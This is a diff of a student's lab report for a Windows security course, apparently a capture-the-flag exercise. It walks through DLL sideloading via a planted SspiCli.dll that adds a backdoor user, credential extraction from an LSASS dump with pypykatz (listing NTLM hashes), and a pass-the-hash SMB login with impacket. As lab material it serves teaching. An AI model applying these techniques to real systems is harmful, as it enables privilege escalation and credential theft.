@@ -1,5 +1,8 @@
 # Windows Security I
 
+Student: Ernst Schwaiger  
+Date: 2025-10-02
+
 ## DLL-Hijack 
 
 ### Setup of Target and Development Systems
@@ -13,10 +16,10 @@
 A Windows-7 (32 bit) virtual machine was created in VirtualBox to execute the `easyftpsvr-1.7.0.2` in. The .iso file was taken from
 https://dn710009.ca.archive.org/0/items/Win7UltimateSP1DEU/6.1.7601.17514-de-Windows_7_x86fre_client_de-de_OEM_Ultimate-GSP1RMCULFREO_DE_DVD.iso
 
-The sysinternals binary was taken from  
+The Sysinternals binary was taken from  
 https://download.heise.de/files/91u2lXHegN-ElbAyvtlAsA/320580/sysinternalssuite.zip?expires=1759311998
 
-In order to get the sysinternals `procmon` to work on the Windows 7 VM, an additional Windows 7 Software Update had to be installed:  
+In order to get the Sysinternals `procmon` to work on the Windows 7 VM, an additional Windows 7 Software Update had to be installed:  
 https://catalog.s.download.windowsupdate.com/d/msdownload/update/software/secu/2015/02/windows6.1-kb3033929-x86_927e018113fe51250c57029635d46b89bf235920.msu
 
 The DLL containing the payload was implemented on a native Windows 11 OS. For the compilation, the Visual Studio Build tools were installed (Variant "Desktop Development with C++")
@@ -73,13 +76,13 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 ```
 
-The "Developer Command Prompt for VS 2022" (installed via Visual Studio Build Tools) is started to run the compilation commands in. As the targeted Windows 7 is a 32 bit OS, it must be ensured that the toolchain generates 32-bit binaries. This is done using the command line
+The "Developer Command Prompt for VS 2022" (installed via Visual Studio Build Tools) is started to run the compilation commands in. As the targeted Windows 7 is a 32 bit OS, it must be ensured that the tool chain generates 32-bit binaries. This is done using the command line
 
 ```bat
 "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars32.bat" x86
 ```
 
-The DLL, and a tiny test.exe are built using the following batch file, which compiles DLL and test app in debug mode and links the runtime statically, which avoids the hassle of having to copy additional DLLs onto the target system:
+The DLL, and a tiny test.exe are built using the following batch file, which compiles both DLL and test app in debug mode and links the runtime statically, which avoids the hassle of having to copy additional DLLs onto the target system:
 
 ```bat
 @ECHO OFF
@@ -105,7 +108,7 @@ cl /LD /nologo %DEFINES% /D _WINDLL %CCOPTS% src/mylib.cpp     /link %LIBPATH% %
 cl     /nologo %DEFINES%            %CCOPTS% src/mylibtest.cpp /link %LIBPATH% %LIBRARIES% /out:mylibtest.exe
 ```
 
-After compilation and testing on the development system, the DLL is copied into the target system, together with the FTPServer sources and the sysinternal binaries. The `easyftpsvr` binary is added into `C:\CCD\easyftpsvr-1.7.0.2`, a folder that can be accessed by any user. The service is installed with admin rights by invoking `easyftpsvr.exe -install`, and now shows up in the lists of services executing in the VM:
+After compilation and testing on the development system, the DLL is copied into the target system, together with the FTPServer sources and the Sysinternals binaries. The `easyftpsvr` binary is added into `C:\CCD\easyftpsvr-1.7.0.2`, a folder that can be accessed by any user. The service is installed with admin rights by invoking `easyftpsvr.exe -install`, and now shows up in the lists of services executing in the VM:
 
 ![Services](Services.png)
 
@@ -117,7 +120,7 @@ If there is no entry in the resulting list, stopping and restarting the service 
 
 ![ProcMonDLLList](ProcMonDLLList.png)
 
-As `sspicli.dll` has been successfully used for DLL sideloading in the past, https://hijacklibs.net/entries/microsoft/built-in/sspicli.html, `mylib.dll` is copied into `C:\CCD\easyftpsvr-1.7.0.2` as `SspiCli.dll`. After stopping and restarting the server, `net user` displays the `BackDoorUser` which was installed when the DLL was loaded.
+As `sspicli.dll` has been successfully used for DLL side loading in the past, https://hijacklibs.net/entries/microsoft/built-in/sspicli.html, `mylib.dll` is copied into `C:\CCD\easyftpsvr-1.7.0.2` as `SspiCli.dll`. After stopping and restarting the server, our copy of `SspiCli.dll` gets loaded. As a consequence, `net user` displays the `BackDoorUser` which was created by the payload code shown above.
 
 ![BackDoorUser](BackDoorUser.png)
 
@@ -142,7 +145,7 @@ For the subsequent analysis steps, a Kali VM was installed in VirtualBox.
 The following Kali image is used:
 [https://cdimage.kali.org/kali-2025.3/kali-linux-2025.3-virtualbox-amd64.7z](https://cdimage.kali.org/kali-2025.3/kali-linux-2025.3-virtualbox-amd64.7z)  
 
-A virtual environment for pypykatz is created by `python3 -m venv ./venv` and started by `. ./venv/bin/activate`. pypykatz is then installed via `pip3 install pypykatz`. In the next step mimikatz is used to create a parseable credentials dump out of the extracted LSA dump. The credentials dump is then put into a filter to produce the relevant outputs, i.e. domain name, user name, and NTLM hash:
+A virtual environment for pypykatz is created by `python3 -m venv ./venv` and started by `. ./venv/bin/activate`. pypykatz is then installed via `pip3 install pypykatz`. In the next step pypykatz is used to create a parseable credentials list out of the extracted LSA memory dump. The credentials list is then put into a filter to produce the relevant outputs, i.e. domain name, user name, and NTLM hash:
 
 ```zsh
 pypykatz lsa minidump lsass.DMP --grep -o credentials.txt
@@ -162,7 +165,7 @@ This returns the following NTLM hashes:
 |Font Driver Host|UMFD-0|e90ad219309a589cce444685cfc2165a|
 |Font Driver Host|UMFD-1|e90ad219309a589cce444685cfc2165a|
 
-The accounts `monitoring`, `admin_laps` are candidates for trying to login subsequently.
+The account `monitoring` is used subsequently to log in to a SMB server.
 
 ## PTH
 >You extracted credentials of the “monitoring” user. This user has access to a monitoring share on the domain controller. Find a way to access it - it seems the password is not available. The target share is “monitoring” on the domain controller. The flag is in flag.txt. 
@@ -180,10 +183,10 @@ The accounts `monitoring`, `admin_laps` are candidates for trying to login subse
 
 Using 
 - the provided password for the account `its26eschwaig`, 
-- the vpn configuration file obtained at the SOPHOS portal and 
+- the VPN configuration file obtained at the SOPHOS portal and 
 - the Kali `openvpn` client,
 
-a vpn connection is set up as follows:
+a VPN connection is set up as follows:
 
 ```zsh
 sudo openvpn --config sslvpn-its26eschwaig-client-config.ovpn
@@ -191,7 +194,7 @@ sudo openvpn --config sslvpn-its26eschwaig-client-config.ovpn
 
 Once the connection is set up, the SMB server `192.168.10.162` becomes available. In the virtual environment created in the previous step, the `smbclient.py` script is downloaded from `https://github.com/fortra/impacket/blob/master/examples/smbclient.py`. Running the script gives an error indicating that `impacket` needs to be installed. This is done in the virtual environment via `pip3 install impacket`.
 
-Invoking `smbclient.py` still gives an error, this time directly in the python module itself, on line 71:
+Invoking `smbclient.py` still gives an error, this time directly in the python module itself, on line 71 (due to the fact that the installed `impacket` is older than the repo from which `smbclient.py` was pulled):
 
 ```zsh
 ./smbclient.py -hashes :2785d316dd37ca24ebb855fcf054c74a -target-ip 192.168.10.162  winctf/monitoring
@@ -212,6 +215,6 @@ by fixing the script like so
     #logger.init(options.ts, options.debug)
     logger.init(options.ts)
 ```
-and running the script again, the `monitoring` share becomes available. Opening it and looking into the content of `flag.txt` reveals the flag:
+and running it again, the `monitoring` share becomes available. Opening it and looking into the content of `flag.txt` reveals the flag:
 
 ![SMB_Connect_Flag](SMB_Connect_Flag.png)
